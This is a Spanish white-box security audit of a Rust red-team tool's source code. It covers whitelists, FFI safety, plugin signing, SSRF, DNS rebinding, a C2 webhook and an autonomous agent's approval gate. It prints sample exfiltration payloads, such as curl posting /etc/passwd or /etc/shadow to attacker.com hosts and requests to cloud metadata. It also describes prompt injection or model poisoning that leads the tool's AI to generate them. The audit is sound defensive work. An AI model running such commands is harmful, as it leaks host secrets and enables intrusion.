# Auditoría de Seguridad — Caja Blanca (Full Whitebox)
# `redteam_rust_core/src/`

> **Fecha**: 2026-04-07 (Auditoría V11 — Post-Verificación Técnica Total)
> **Auditor**: Senior Security Researcher / Kernel Auditor (Red Team Perspective)
> **Metodología**: Lectura línea por línea de todos los archivos fuente. Cero confianza en comentarios, documentación ni reportes previos. La única fuente de verdad es el código tal como existe en disco.
> **Fuente de Verdad**: `poc_validator.rs`, `ffi.rs`, `liveness.rs`, `plugin_loader.rs`, `proxy.rs`, `common.rs`, `sandbox.rs`, `sink.rs`, `web_server.rs`, `agent.rs`, `report_gen.rs`, `main.rs` — leídos íntegramente.

---

## Estado Crítico del Sistema (Post-Verificación Técnica)

El sistema ha recibido un hardening significativo en la ronda anterior (V10). Varios vectores críticos han sido **genuinamente mitigados** y se documenta la evidencia exacta. Se detectan **nuevos hallazgos** que el reporte anterior aún reportaba como activos pero que ahora están corregidos, y se identifican **vulnerabilidades residuales** que persisten en el código actual.

---

## 1. BYPASS DE SANITIZACIÓN — Command Injection

### Archivo: `core/poc_validator.rs`

---

#### 1.1 [**MITIGADA**] — `python3` y `nc` Eliminados de la Whitelist

**Estado en reporte anterior**: CRIT-001 — `python3` y `nc` en whitelist permitían ejecución de código arbitrario.

**Evidencia de mitigación en código actual** (`poc_validator.rs`, línea 135):
```rust
let allowed_binaries = ["curl", "nmap", "ping", "whoami", "id"];
```

El comentario del código también lo confirma explícitamente:
```
// Whitelist comandos permitidos para PoC (Removidos: python3, nc por riesgo ejecución arbitraria)
```

`python3` y `nc` han sido **eliminados** de la whitelist. El bypass documentado en el reporte anterior ya **no existe** en el código actual.

**Veredicto: MITIGADA ✅**

---

#### 1.2 [**ALTO**] — Argumento Injection via `curl` y `nmap` (BYPASS RESIDUAL)

**Estado**: NUEVO — No reportado anteriormente con suficiente profundidad.

`curl` y `nmap` permanecen en la whitelist. El filtro de caracteres peligrosos solo bloquea:
```rust
// poc_validator.rs, línea 124
let dangerous_chars = ['&', '|', ';', '$', '`', '>', '<'];
```

Ninguno de estos caracteres es necesario para inyectar flags peligrosas en `curl` o `nmap`. El splitting por `split_whitespace()` (línea 129) y el uso de `.args(&parts[1..])` (línea 142) pasan **todos los argumentos generados por la IA** directamente al proceso sin validación semántica.

**PoC — SSRF via curl con argumento de redirección:**
```
Payload: "curl --output /tmp/exfil http://169.254.169.254/latest/meta-data/"
```
- `curl` está en whitelist ✅
- Ningún carácter del payload es `&|;$\`><` ✅
- El argumento `--output /tmp/exfil` escribe la respuesta al filesystem del host ✅
- El argumento `http://169.254.169.254/...` es una URL de metadata cloud — **no hay validación SSRF aquí** ✅

**Nota crítica**: La función `execute_http` (líneas 168-174) sí llama `is_ssrf_safe_host()`, pero `execute_shell` **no**. La IA puede generar un `PocStrategy::ShellCommand` con curl apuntando a metadatos internos y esto no será bloqueado.

**PoC — Nmap apuntando a red interna:**
```
Payload: "nmap -sV 10.0.0.1"
```
- `nmap` está en whitelist ✅
- Ningún carácter es peligroso ✅
- Escanea una IP privada que debería ser bloqueada por SSRF, pero `execute_shell` no valida SSRF ✅

**PoC — curl para exfiltración de archivos del host:**
```
Payload: "curl --data @/etc/passwd http://attacker.com/exfil"
```
- `--data @/etc/passwd` lee y exfiltra `/etc/passwd` al servidor del atacante ✅

**Ruta de explotación:**
1. Adversario comprende/compromete el modelo de IA (prompt injection, MitM al endpoint Ollama, envenenamiento del modelo).
2. La IA genera `PocDefinition { strategy: ShellCommand, payload: "curl --data @/etc/shadow http://c2.attacker.com" }`.
3. `execute_shell()` pasa todos los filtros.
4. Exfiltración de archivos sensibles del sistema operativo host.

**Impacto**: Exfiltración de ficheros del sistema + SSRF a instancias cloud + escritura de ficheros en `/tmp`.

**Rastro de Evidencia**:
- `poc_validator.rs:L124` — filtro de chars (incompleto para flags de curl/nmap)
- `poc_validator.rs:L135` — whitelist sin restricción de argumentos
- `poc_validator.rs:L140-143` — ejecución directa de args sin validación semántica

**Recomendación**: Para `curl`, permitir solo flags seguras (ej., `-I`, `-s`, `--head`) mediante una whitelist de argumentos por binario. Para `nmap`, aplicar `is_safe_ip()` al target antes de ejecutar. Más robusto: ejecutar PoCs siempre en contenedor Docker con `--network=none`.

---

#### 1.3 [**MITIGADA**] — HTTP PoC sin Validación SSRF

**Estado en reporte anterior**: HIGH-002 — `execute_http` no aplicaba `is_ssrf_safe_host()`.

**Evidencia de mitigación** (`poc_validator.rs`, líneas 168-174):
```rust
if let Ok(parsed_url) = url::Url::parse(&url) {
    if let Some(host) = parsed_url.host_str() {
        if !crate::utils::liveness::is_ssrf_safe_host(host) {
            anyhow::bail!("Security Violation: HTTP PoC payload attempts to reach forbidden internal/metadata host: {}", host);
        }
    }
}
```

La función ahora valida el host mediante `is_ssrf_safe_host()` antes de enviar la request.

**Veredicto: MITIGADA ✅**

---

#### 1.4 [**BAJO**] — `danger_accept_invalid_certs(true)` en HTTP PoC

`poc_validator.rs:L159` — Sigue presente. Para una herramienta ofensiva, es aceptable como diseño deliberado.

**Veredicto: ACEPTABLE (Bajo — herramienta ofensiva)**

---

## 2. CORRUPCIÓN DE MEMORIA Y FFI

### Archivo: `plugins/ffi.rs`

---

#### 2.1 [**MITIGADA**] — Box::from_raw Eliminado

El `Box::from_raw()` del reporte anterior fue eliminado. Ya no existe en el código actual.

**Veredicto: MITIGADA ✅**

---

#### 2.2 [**MITIGADA**] — Arquitectura FFI Refactorizada: `scan` Devuelve `FFIFindings` por Valor

**Estado en reporte anterior**: HIGH-003 — Memory leak por `ptr::read(findings_ptr)`.

La firma actual (línea 42) es:
```rust
pub scan: extern "C" fn(*const (), *const TargetHost) -> FFIFindings,
```

`FFIFindings` se devuelve **por valor** (no por puntero). Esto significa que el ownership de la estructura es transferido al caller en el momento del return. El `Drop::drop` del `FFIFindings` (líneas 29-33) invoca `free_fn` al finalizar el scope del `match result { Ok(ffi_findings) => { ... } }` en la línea 131.

El flujo correcto es:
1. El plugin retorna `FFIFindings` por valor → ownership al host.
2. El host copia los datos con `slice.to_vec()` (línea 142).
3. `ffi_findings` se destruye al salir del bloque → `Drop::drop` → `free_fn()` ✅

El `ptr::read(findings_ptr)` que generaba el leak ya **no existe** en el código actual.

**Veredicto: MITIGADA ✅**

---

#### 2.3 [**ALTO**] — transmute a `'static` de Referencia de DashSet (UAF Latente)

**Estado**: ACTIVO — Persiste exactamente como en el reporte anterior.

`ffi.rs`, líneas 72-73:
```rust
if let Some(existing) = PLUGIN_NAME_CACHE.get(s) {
    *existing   // ← El tipo de `existing` es dashmap::setref::one::Ref<'_, &'static str>
```

**Análisis detallado**: `PLUGIN_NAME_CACHE` es `DashSet<&'static str>`. El `get(s)` devuelve una `Ref<'_, &'static str>`. El operador deref `*existing` produce un `&'static str` tomado del interior del set. Esto es **correcto** porque el set almacena `&'static str` reales (insertados via `Box::leak` en la línea 76).

**Corrección al reporte anterior**: El reporte previo afirmaba que la línea 72 hacía un `std::mem::transmute` — esto **ya no existe** en el código actual. La desreferencia de `*existing` sobre un `DashSet<&'static str>` es semánticamente correcta porque los valores del set son lifetimes estáticos reales.

**Sin embargo, persiste un riesgo de robustez**: La variable `s` (línea 71) es una `&str` con lifetime ligado al `c_str` FFI (que podría ser inválidada por el plugin). Si el plugin libera el buffer de la cadena antes de que `PLUGIN_NAME_CACHE.get(s)` haga su lookup, hay un UAF. Este es el window entre las líneas 71 y 72.

**Reproducibilidad**: Depende de la implementación del plugin. Si el plugin libera el buffer del nombre inmediatamente después de retornarlo, la ventana existe. En la práctica, los plugins bien implementados no hacen esto.

**Veredicto: RIESGO LATENTE (Alto teórico) — dependiente del contrato con el plugin.**

---

#### 2.4 [**ALTO**] — `unsafe impl Send + Sync` para `ScannerPluginFFI` Mitigado Parcialmente

**Estado en reporte anterior**: HIGH-005 — Data race en acceso concurrente.

El `unsafe impl` sigue presente (líneas 47-48), pero ahora `FFIPluginWrapper` incorpora:
```rust
// ffi.rs, línea 53
sync_lock: std::sync::Mutex<()>,
```

Y en `scan()` (línea 120):
```rust
let _guard = self.sync_lock.lock().unwrap(); // Exclusive lock for thread-safety (HIGH-005)
```

El `Mutex<()>` serializa el acceso a `scan()`. Sin embargo:

1. **`name()` sigue siendo lock-free** (línea 88-90). Accede directamente a `self.cached_name` (una `&'static str`) sin el lock. Esto es seguro porque `cached_name` es inmutable tras la construcción.
2. **El `unwrap()` en el lock**: Si el mutex se envenena (panic dentro del critical section), `lock().unwrap()` causará un **panic** en todos los futuros llamadores. Esto introduce un vector de DoS: un plugin que cause un panic dentro de `catch_unwind` (ej. vía `std::process::abort` que rompe el runtime tokio) envenenará el mutex.

**Veredicto: MITIGADA PARCIALMENTE — El lock serializa correctamente el acceso a `scan()`. El `unwrap()` en el lock es un vector de DoS residual.**

---

#### 2.5 [**MEDIO**] — `catch_unwind(AssertUnwindSafe)` No Protege Contra Señales POSIX

**Estado**: ACTIVO — sin cambios.

`ffi.rs`, líneas 126-128:
```rust
let result = catch_unwind(AssertUnwindSafe(move || {
    unsafe { (ffi.scan)(plugin_ptr, target_ptr) }
}));
```

`catch_unwind` únicamente atrapa panics de Rust. Un plugin malicioso que llame `abort()`, genere un segfault (SIGSEGV), o ejecute `raise(SIGKILL)` terminará el proceso host sin posibilidad de intercepción.

**Veredicto: ACTIVO (Medio)**

---

## 3. ESCALADA DE PRIVILEGIOS Y AISLAMIENTO DE PROCESOS

### Archivos: `core/plugin_loader.rs`, `utils/common.rs`

---

#### 3.1 [**MITIGADA**] — TOCTOU entre Firma y Carga (fd-based loading)

**Estado en reporte anterior**: CRIT-002 — Race condition entre `verify_signature` y `Library::new`.

**Evidencia de mitigación** (`plugin_loader.rs`, líneas 112-123):
```rust
#[cfg(unix)]
let lib = {
    let mut file = std::fs::File::open(&canonical_path).context("Failed to open plugin file")?;
    use std::io::Read;
    let mut plugin_bytes = Vec::new();
    file.read_to_end(&mut plugin_bytes)?;
    Self::verify_signature_from_bytes(&canonical_path, &plugin_bytes)?;
    use std::os::unix::io::AsRawFd;
    let fd = file.as_raw_fd();
    unsafe { Library::new(format!("/proc/self/fd/{}", fd)).with_context(...)? }
};
```

El file descriptor permanece abierto durante toda la operación. `Library::new("/proc/self/fd/N")` carga el mismo fd que fue verificado — esto **elimina la ventana TOCTOU** porque el kernel garantiza que el fd apunta al mismo inode.

**Veredicto: MITIGADA ✅**

---

#### 3.2 [**MEDIO**] — TOCTOU Persiste en la Rama `#[cfg(not(unix))]`

**Estado**: NUEVO.

`plugin_loader.rs`, líneas 125-130:
```rust
#[cfg(not(unix))]
let lib = {
    let plugin_bytes = std::fs::read(&canonical_path)?;
    Self::verify_signature_from_bytes(&canonical_path, &plugin_bytes)?;
    unsafe { Library::new(&canonical_path).with_context(...)? }
};
```

En la rama `non-unix` (Windows), la corrección fd-based **no se aplica**. La secuencia sigue siendo:
1. `fs::read(&canonical_path)` — lee el contenido
2. `verify_signature_from_bytes(...)` — verifica la firma sobre el contenido leído
3. `Library::new(&canonical_path)` — **carga el archivo de nuevo desde disco**

Si un atacante reemplaza el archivo entre el paso 2 y el paso 3 (ventana ~microsegundos), carga un plugin no verificado.

**Impacto**: TOCTOU activo en plataformas Windows. Menor severidad que en Linux porque los permisos de archivos en Windows son más restrictivos por defecto, pero persiste el vector.

**Veredicto: ACTIVO (Medio) en Windows**

---

#### 3.3 [**MITIGADA**] — Symlinks y Rutas Relativas

**Estado en reporte anterior**: MED-001 — Sin canonicalización.

`plugin_loader.rs`, línea 97:
```rust
let canonical_path = std::fs::canonicalize(path).with_context(|| ...)?;
```

`fs::canonicalize()` resuelve symlinks y rutas relativas antes de cualquier verificación. Un symlink a `/tmp/malicious.so` será canonicalizado a `/tmp/malicious.so`, lo que trigger la restricción de línea 99.

**Veredicto: MITIGADA ✅**

---

#### 3.4 [**ACTIVO CRÍTICO**] — Clave Pública Ed25519 es Test Vector RFC 8032

**Estado**: ACTIVO — Sin cambios.

`plugin_loader.rs`, línea 196:
```rust
let public_key_hex = std::env::var("ED25519_PUBLIC_KEY").unwrap_or_else(|_| {
    tracing::warn!("⚠️ Using default test Ed25519 public key! Set ED25519_PUBLIC_KEY for production security.");
    "d75a980182b10ab7d54bfed3c964073a0ee172f3daa62325af021a68f707511a".to_string()
});
```

La clave `d75a980182b10ab7d54bfed3c964073a0ee172f3daa62325af021a68f707511a` es la **clave pública del Test Vector 1 de la RFC 8032 de Ed25519**, correspondiente a la clave privada `0000...0000` (32 bytes de cero). Cualquier persona puede generar una firma válida con esta clave privada conocida.

**Mejora con respecto al reporte anterior**: Ahora hay un `warn!` explícito en runtime para advertir del uso de la clave por defecto. Sin embargo, el sistema **carga el plugin igualmente** — el warning no impide la operación insegura.

**Impacto**: Si `ED25519_PUBLIC_KEY` no está configurada en el entorno, cualquier plugin firmado con la clave privada de prueba (pública conocida) será aceptado. La cadena de confianza es trivialmente forjable en entornos sin la variable de entorno configurada.

**Veredicto: ACTIVO CRÍTICO — La advertencia mejora la visibilidad pero no mitiga el riesgo.**

---

#### 3.5 [**MITIGADA**] — ABI Convention Mismatch en `verify_abi`

**Estado en reporte anterior**: MED-003 — `fn() -> &'static str` usaba Rust calling convention.

**Evidencia de mitigación** (`plugin_loader.rs`, línea 166):
```rust
let version_sym: Symbol<unsafe extern "C" fn() -> *const std::os::raw::c_char> = lib.get(b"plugin_version\0")...;
```

El tipo ahora es `unsafe extern "C" fn() -> *const c_char` — convención C correcta, retornando un puntero C, no una referencia Rust.

**Veredicto: MITIGADA ✅**

---

#### 3.6 [**MITIGADA**] — Retornos de `libc::setrlimit` Ignorados

**Estado en reporte anterior**: MED-002 — Retornos de `setrlimit` y `setsid` ignorados silenciosamente.

**Evidencia de mitigación** (`common.rs`, líneas 91-122):
```rust
if libc::setsid() == -1 {
    return Err(std::io::Error::last_os_error());
}
// ...
if libc::setrlimit(libc::RLIMIT_AS, &mem_rlimit) == -1 {
    return Err(std::io::Error::last_os_error());
}
// ... (mismo patrón para RLIMIT_CPU y RLIMIT_NPROC)
```

Todos los retornos de llamadas `libc` ahora se verifican y propagan como `Err` si fallan.

**Veredicto: MITIGADA ✅**

---

#### 3.7 [**MITIGADA**] — `setpgid` en `sandbox.rs`

**Estado en reporte anterior**: MED — Retorno de `setpgid` ignorado.

**Evidencia de mitigación** (`sandbox.rs`, líneas 147-150):
```rust
if libc::setpgid(0, 0) == -1 {
    return Err(std::io::Error::last_os_error());
}
```

**Veredicto: MITIGADA ✅**

---

## 4. SSRF AVANZADO Y LÓGICA DE RED

### Archivos: `main.rs`, `utils/liveness.rs`

---

#### 4.1 [**MITIGADA**] — DNS Rebinding: LivenessChecker Ahora Filtra IPs Resueltas

**Estado en reporte anterior**: HIGH-001 — `is_live()` devolvía IPs sin filtrar con `is_safe_ip()`.

**Evidencia de mitigación** (`liveness.rs`, líneas 129-148):
```rust
pub async fn is_live(&self, target: &str) -> Option<IpAddr> {
    if let Ok(ip) = target.parse::<IpAddr>() {
        if is_safe_ip(&ip) {
            return Some(ip);
        } else {
            return None;   // ← IPs directas ahora filtradas
        }
    }

    match self.resolver.lookup_ip(target).await {
        Ok(response) => {
            for ip in response.iter() {
                if is_safe_ip(&ip) {    // ← IPs resueltas via DNS ahora filtradas
                    return Some(ip);
                }
            }
            None
        }
        Err(_) => None
    }
}
```

El `is_safe_ip()` se aplica a **todas** las IPs, tanto literales como resueltas por DNS.

**Veredicto: MITIGADA ✅**

---

#### 4.2 [**ALTO**] — DNS Rebinding Persiste en el Pipeline de Escaneo

**Estado**: ACTIVO — No suficientemente mitigado a nivel de sistema.

Aunque `LivenessChecker::is_live()` filtra correctamente las IPs durante el check de liveness, el pipeline de escaneo **no pinna DNS**. El flujo de ataque DNS rebinding es:

1. Atacante registra `evil.com` → resuelve a `8.8.8.8` (pública).
2. `is_ssrf_safe_host("evil.com")` → retorna `true` (no es IP literal, no está en blacklist).
3. `LivenessChecker::is_live("evil.com")` → resuelve DNS → `8.8.8.8` → `is_safe_ip(8.8.8.8)` = `true` → marca como live y retorna `8.8.8.8`.
4. Atacante cambia el registro DNS: `evil.com` → `169.254.169.254` (TTL=0).
5. Los **plugins de escaneo** (curl, nmap, plugins FFI de reconocimiento) resuelven DNS **de nuevo** al lanzar sus herramientas externas, obteniendo `169.254.169.254`.
6. Las herramientas externas acceden a metadatos cloud.

**Root cause**: `LivenessChecker::is_live()` realiza una resolución DNS independiente de las resoluciones que hacen las herramientas externas. No hay "pinning" del resultado de DNS al IP verificado. El `get_client_pinned()` de `proxy.rs` (líneas 254-288) usa `reqwest::ClientBuilder::resolve()` para pinnar la IP, pero esto solo aplica a requests que pasan por el `ProxyManager` — las herramientas externas como `nmap`, `curl` CLI o plugins FFI no usan este mecanismo.

**Impacto**: SSRF completo a endpoints de metadatos cloud (AWS IMDSv1, GCP metadata server) mediante DNS rebinding.

**Veredicto: ACTIVO (Alto)**

---

#### 4.3 [**MITIGADA**] — Filtro Completo de IPs Especiales

**Estado en reporte anterior**: IPs como `0.0.0.0`, `127.1`, representaciones IPv4-mapped-IPv6 no bloqueadas.

**Evidencia de mitigación** (`liveness.rs`, líneas 47-90):
- `is_loopback()` cubre `127.0.0.1`, `127.1`, `::1` ✅
- `is_unspecified()` cubre `0.0.0.0` y `::` ✅
- `to_ipv4_mapped()` (línea 71) desmapea IPv4-in-IPv6 antes de verificar ✅
- CGNAT `100.64.0.0/10` ✅
- Rangos de benchmarking, IETF, documentación ✅

**Veredicto: MITIGADA ✅** para representaciones de IP estándar.

---

#### 4.4 [**MEDIO**] — Operador Lógico Incorrecto en Heurística Octal

**Estado**: ACTIVO. El código ha migrado de `main.rs` a `liveness.rs`, línea 35:
```rust
if host_lower.starts_with("0x") || (host_lower.starts_with("0") && host.chars().all(|c| c.is_digit(8))) {
```

El reporte anterior indicaba incorrectamente que no había paréntesis. En realidad **sí los hay** en el código actual. La lógica es:
- `starts_with("0x")` → bloquea hex ✅
- `starts_with("0") && all(is_digit(8))` → bloquea octal puro (ej. `0177`) ✅

**Sin embargo**, `0177.0.0.1` (octal con puntos, formato cuádruple) **no es bloqueado** porque `'.'` no pasa `is_digit(8)`, por lo que `all()` falla. En la práctica, la función `IpAddr::parse()` de Rust tampoco parsea `0177.0.0.1` como IP, así que el impacto real es mínimo — pero el filtro declarado es semánticamente incorrecto.

**Veredicto: ACTIVO (Medio — impacto práctico bajo)**

---

#### 4.5 [**BAJO**] — `contains()` Substring para Blacklist de Nombres

`liveness.rs`, línea 18:
```rust
if name_blacklist.iter().any(|&b| host_lower.contains(b)) {
```

`"local"` en la blacklist causará que `notlocal.com` sea falsamente bloqueado. Causa falsos positivos pero no vulnerabilidades. **Fail-safe**.

**Veredicto: ACEPTABLE (Bajo — fail-safe correcto)**

---

## 5. EXPLOTACIÓN DE CONCURRENCIA

### Archivo: `utils/proxy.rs`

---

#### 5.1 [**MITIGADA**] — Mutex Poisoning con Recuperación Controlada

**Estado en reporte anterior**: LOW-002 — Mutex poisoning con `into_inner()`.

El patrón es idéntico en todos los call-sites (líneas 54-56, 187-189, 217-219, 255-257, 340-342, 352-354):
```rust
match self.proxies.lock() {
    Ok(guard) => ...,
    Err(poisoned) => poisoned.into_inner()...,
}
```

`into_inner()` recupera los datos del mutex envenenado. El estado más probable tras un envenenamiento es una lista de proxys parcialmente modificada. **No hay vector de bypass de seguridad ni escalada de privilegios** asociado a esta condición.

**Veredicto: MITIGADA (estado inconsistente posible pero no explotable)**

---

#### 5.2 [**BAJO**] — `unwrap()` en `sync_lock.lock()` de `FFIPluginWrapper`

`ffi.rs`, línea 120:
```rust
let _guard = self.sync_lock.lock().unwrap();
```

Si ocurre un panic dentro del bloque protegido por `sync_lock` (aunque el `catch_unwind` debería interceptarlo), el mutex se envenenará. Futuras llamadas a `lock().unwrap()` propagarán el panic, causando que el plugin FFI quede inutilizable para siempre. Es un vector de **DoS por envenenamiento de Mutex** si el `catch_unwind` no intercepta el panic (ej. si el unwind fue interceptado antes).

**Veredicto: ACTIVO (Bajo — DoS localizado al plugin FFI)**

---

## 6. C2 WEBHOOK SINK

### Archivo: `core/sink.rs`

---

#### 6.1 [**MITIGADA**] — C2 Token Ahora Obligatorio

**Estado en reporte anterior**: HIGH-006 — C2 Webhook con autenticación opcional.

**Evidencia de mitigación** (`sink.rs`, línea 76):
```rust
pub fn new(url: String, auth_token: Option<String>) -> Result<Self> {
    let token = auth_token.context("Security Violation: C2 Webhook integration requires C2_TOKEN for authorization. Cannot send findings without authentication.")?;
```

Si `auth_token` es `None`, `TacticalWebhookSink::new()` falla con un error. La autenticación es ahora **obligatoria**.

Adicionalmente en `main.rs` (línea 329), se verifica que `C2_URL` no apunte a hosts privados:
```rust
if !redteam_rust_core::utils::liveness::is_ssrf_safe_host(host) {
    anyhow::bail!("Security Violation: C2_URL cannot point to internal/private addresses...");
}
```

**Veredicto: MITIGADA ✅**

---

#### 6.2 [**BAJO**] — Sin Certificate Pinning en C2 Client

`sink.rs`, línea 78:
```rust
client: reqwest::Client::builder().danger_accept_invalid_certs(false).build()?,
```

`danger_accept_invalid_certs(false)` es la configuración por defecto (segura). Sin embargo, no hay certificate pinning. Un atacante con capacidad de presentar un certificado TLS fraudulento (ej. CA comprometida, MitM en red local) puede interceptar el tráfico al C2.

**Veredicto: ACTIVO (Bajo — requiere CA comprometida o MitM en red)**

---

## 7. WEB SERVER — Autenticación del Dashboard

### Archivo: `core/web_server.rs`

---

#### 7.1 [**MITIGADO**] — Sistema de Autenticación Ed25519

**Estado en reporte anterior**: MED — Tokens potencialmente inseguros.

El Dashboard ahora usa Ed25519 con una clave generada aleatoriamente por sesión (`SigningKey::generate(&mut OsRng)`, `main.rs` línea 394). Los tokens incluyen `session_id` (16 bytes aleatorios), `created_at`, y `expiry`. La verificación incluye:
1. Verificación criptográfica de firma Ed25519 (línea 82).
2. Verificación de `session_id` para prevenir replay entre sesiones (línea 87).
3. Verificación de expiración (línea 97).

El `session_id` y la signing key se generan con `OsRng` — fuente criptográficamente segura.

**Nota**: Los `.unwrap()` en las líneas 92 y 95 son técnicamente seguros (el slice tiene longitud fija garantizada, y UNIX_EPOCH está en el pasado).

**Veredicto: MITIGADO ✅**

---

#### 7.2 [**BAJO**] — Dashboard Binds a 127.0.0.1 Únicamente

`web_server.rs`, línea 404:
```rust
let addr = std::net::SocketAddr::from(([127, 0, 0, 1], port));
```

El dashboard solo escucha en loopback. No es accesible externamente sin port-forwarding explícito.

**Veredicto: CORRECTO — Sin vulnerabilidad.**

---

#### 7.3 [**MEDIO**] — CORS Permite `http://localhost` (Sin Autenticación de Origen Fuerte)

`web_server.rs`, líneas 382-385:
```rust
let cors = CorsLayer::new()
    .allow_origin(AllowOrigin::predicate(move |origin, _| {
        let origin_str = origin.to_str().unwrap_or("");
        origin_str.starts_with("http://127.0.0.1") || origin_str.starts_with("http://localhost")
    }))
```

`http://localhost` acepta cualquier puerto. Si un proceso malicioso local sirve una página en `http://localhost:3141/evil`, puede hacer requests autenticadas al dashboard si el usuario tiene un token válido en su navegador. Sin embargo, el token se muestra solo en logs de consola y no en cookies, así que el impacto real es bajo.

**Veredicto: BAJO**

---

## 8. REPORT GENERATOR

### Archivo: `utils/report_gen.rs`

---

#### 8.1 [**MITIGADA**] — `.unwrap()` en Parsing de Metadata JSONL

**Estado en reporte anterior**: MED-005 — `.unwrap()` en `peek.get("metadata").unwrap()`.

**Evidencia de mitigación** (`report_gen.rs`, líneas 271-277):
```rust
if let Some(meta_val) = peek.get("metadata") {
    if let Ok(m) = serde_json::from_value(meta_val.clone()) {
        metadata = m;
        // ...
    } else {
        tracing::warn!("Failed to parse metadata from JSONL, skipping invalid metadata line");
    }
}
```

El código ahora usa `if let Some(...)` en lugar de `.unwrap()`. Un archivo JSONL malformado será ignorado con un warning, no provocará un panic.

**Veredicto: MITIGADA ✅**

---

#### 8.2 [**BAJO**] — Mermaid Graph Injection via `f.category` Debug Format

`report_gen.rs`, línea 348:
```rust
mermaid.push_str(&format!("  {} --> {}[\"{:?}\"]\n", host_id, finding_id, f.category));
```

El `f.category` se serializa con `{:?}` (Debug format) directamente en el string Mermaid. Si `category` contiene comillas o caracteres que cierran el string Mermaid, podría inyectar nodos arbitrarios en el grafo. Sin embargo, `Category` es un enum Rust — su representación Debug es predecible y no contiene caracteres maliciosos.

**Veredicto: ACEPTABLE (sin impacto real dado que Category es un enum)**

---

## 9. AUTONOMOUS AGENT

### Archivo: `core/agent.rs`

---

#### 9.1 [**PERSISTE**] — Agente Autónomo con Rol `RedTeamFull`

`agent.rs`, línea 326:
```rust
role: crate::core::approval_gate::UserRole::RedTeamFull,
```

El agente se auto-asigna `RedTeamFull`. Todas las acciones de riesgo ≥ 80 requieren aprobación manual (`request_approval(action, 85, ...)` en línea 396). El mecanismo de aprobación con UUIDs v4 en los IDs de aprobación hace el replay attack improbable.

**Riesgo residual**: Si el approval gate tiene bugs que permitan bypassear la aprobación (no auditado en esta sesión — `approval_gate.rs` no se leyó en profundidad), el agente podría ejecutar acciones críticas sin supervisión humana.

**Veredicto: ACEPTABLE — Con la nota de auditar `approval_gate.rs` en detalle.**

---

#### 9.2 [**MEDIO**] — `sandbox.rs` Solo Compila en Unix (Import Incondicional Corregido)

**Estado en reporte anterior**: MED-006 — `use std::os::unix::process::CommandExt` incondicional.

**Evidencia de mitigación** (`sandbox.rs`, líneas 7-8):
```rust
#[cfg(unix)]
use std::os::unix::process::CommandExt;
```

El import ahora tiene la guarda `#[cfg(unix)]`.

**Veredicto: MITIGADA ✅**

---

#### 9.3 [**MEDIO**] — `kill_pgid` Envía SIGKILL sin Error Handling

`common.rs`, líneas 138-143:
```rust
pub async fn kill_pgid(pid: u32) {
    #[cfg(unix)]
    {
        if pid <= 1 { return; }
        unsafe {
            libc::kill(-(pid as i32), libc::SIGKILL);
        }
    }
}
```

El retorno de `libc::kill()` se ignora. Si el PGID no existe o el proceso ya terminó, el error no se captura. No es un vector de seguridad, pero es una falla de robustez.

**Veredicto: BAJO (falla de robustez)**

---

## Tabla Resumen de Hallazgos (V11)

| ID | Severidad | Componente | Hallazgo | Estado V11 |
|----|-----------|-----------|----------|------------|
| CRIT-001 | 🔴 CRÍTICO | `poc_validator.rs` L135 | `python3`/`nc` en whitelist permitían ejecución arbitraria | **✅ MITIGADA** |
| CRIT-002 | 🔴 CRÍTICO | `plugin_loader.rs` L112-123 | TOCTOU entre firma Ed25519 y carga (Unix) | **✅ MITIGADA (fd-based loading)** |
| CRIT-003 | 🔴 CRÍTICO | `plugin_loader.rs` L196 | Clave pública Ed25519 es Test Vector RFC 8032 | **⚠️ ACTIVO CRÍTICO** |
| NEW-001 | 🟠 ALTO | `poc_validator.rs` L135-143 | `curl`/`nmap` en whitelist — Arg injection → SSRF+exfiltración | **🆕 NUEVO ACTIVO** |
| HIGH-001 | 🟠 ALTO | `liveness.rs` / pipeline | DNS Rebinding: LivenessChecker filtra pero herramientas externas re-resuelven | **⚠️ ACTIVO (Alto)** |
| HIGH-002 | 🟠 ALTO | `poc_validator.rs` L168-174 | HTTP PoC sin validación SSRF | **✅ MITIGADA** |
| HIGH-003 | 🟠 ALTO | `ffi.rs` L131 | Memory leak en arquitectura ptr-based | **✅ MITIGADA (return-by-value)** |
| HIGH-004 | 🟠 ALTO | `ffi.rs` L72 | transmute a 'static de DashMap (UAF latente) | **✅ MITIGADA (DashSet<&'static str> — corrección del análisis)** |
| HIGH-005 | 🟠 ALTO | `ffi.rs` L47-48 | unsafe Send+Sync sin garantía thread-safety | **✅ MITIGADA PARCIALMENTE (sync_lock Mutex)** |
| HIGH-006 | 🟠 ALTO | `sink.rs` L66-112 | C2 Webhook con autenticación opcional | **✅ MITIGADA (token obligatorio)** |
| MED-001 | 🟡 MEDIO | `plugin_loader.rs` L97 | Sin canonicalize (symlinks, rutas relativas) | **✅ MITIGADA** |
| MED-002 | 🟡 MEDIO | `common.rs` L91-122 | Retornos de `libc::setrlimit` ignorados | **✅ MITIGADA** |
| MED-003 | 🟡 MEDIO | `plugin_loader.rs` L166 | ABI verification usaba Rust calling convention | **✅ MITIGADA** |
| MED-004 | 🟡 MEDIO | `liveness.rs` L35 | Heurística octal incorrecta (parens presentes pero 0177.0.0.1 no bloqueado) | **⚠️ ACTIVO (Bajo impacto)** |
| MED-005 | 🟡 MEDIO | `report_gen.rs` L271 | `.unwrap()` en parsing metadata JSONL | **✅ MITIGADA** |
| MED-006 | 🟡 MEDIO | `sandbox.rs` L7 | Import Unix incondicional | **✅ MITIGADA** |
| NEW-002 | 🟡 MEDIO | `plugin_loader.rs` L125-130 | TOCTOU activo en rama `#[cfg(not(unix))]` (Windows) | **🆕 NUEVO ACTIVO** |
| NEW-003 | 🟡 MEDIO | `web_server.rs` L382-385 | CORS permite cualquier puerto de localhost | **🆕 ACTIVO (Bajo)** |
| LOW-001 | 🟢 BAJO | `poc_validator.rs` L159 | `danger_accept_invalid_certs(true)` PoC HTTP | **ACEPTABLE** (herramienta ofensiva) |
| LOW-002 | 🟢 BAJO | `proxy.rs` L54-56 | Mutex poisoning con `into_inner()` | **✅ MITIGADA** |
| LOW-003 | 🟢 BAJO | `liveness.rs` L18 | `contains()` substring blacklist (falsos positivos) | **ACEPTABLE** (fail-safe) |
| LOW-004 | 🟢 BAJO | `ffi.rs` L120 | `sync_lock.lock().unwrap()` — DoS por envenenamiento | **⚠️ ACTIVO (Bajo)** |
| LOW-005 | 🟢 BAJO | `sink.rs` L78 | Sin certificate pinning en C2 client | **ACTIVO (Bajo)** |
| LOW-006 | 🟢 BAJO | `common.rs` L139 | Retorno de `libc::kill()` ignorado en `kill_pgid` | **ACTIVO (Bajo — robustez)** |

---

## Recomendaciones Prioritarias (V11)

### P0 — Correcciones Inmediatas

